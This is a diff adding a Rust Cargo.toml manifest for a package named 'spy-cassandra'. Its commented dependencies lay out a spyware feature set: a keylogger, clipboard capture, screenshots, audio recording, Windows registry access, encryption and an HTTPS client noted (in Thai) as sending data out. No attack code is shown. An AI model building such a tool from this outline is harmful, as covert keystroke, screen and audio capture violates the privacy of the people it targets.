@@ -1,0 +1,25 @@
+[package]
+name = "spy-cassandra"
+version = "1.0.0"
+edition = "2021"
+
+[dependencies]
+tokio = { version = "1", features = ["full"] }
+aes-gcm = "0.10"
+rand = "0.8"
+serde = { version = "1", features = ["derive"] }
+serde_json = "1"
+rdev = "0.5"                  # keylogger
+clipboard = "0.5"             # clipboard
+screenshots = "0.8"
+image = "0.24"
+winreg = "0.52"
+windows = { version = "0.58", features = ["Win32_System_Com", "Win32_Media_Audio", "Win32_UI_WindowsAndMessaging", "Win32_System_Console", "Win32_Security_Cryptography"] }
+rusqlite = "0.31"
+toml = "0.8"
+reqwest = { version = "0.12", features = ["json"] }  # ส่งข้อมูล HTTPS
+cpal = "0.15"                 # audio recording
+base64 = "0.21"               # base64 encoding
+chrono = "0.4"                # timestamps
+whoami = "1.5"                # hostname
+hound = "3.5"                 # WAV encoding
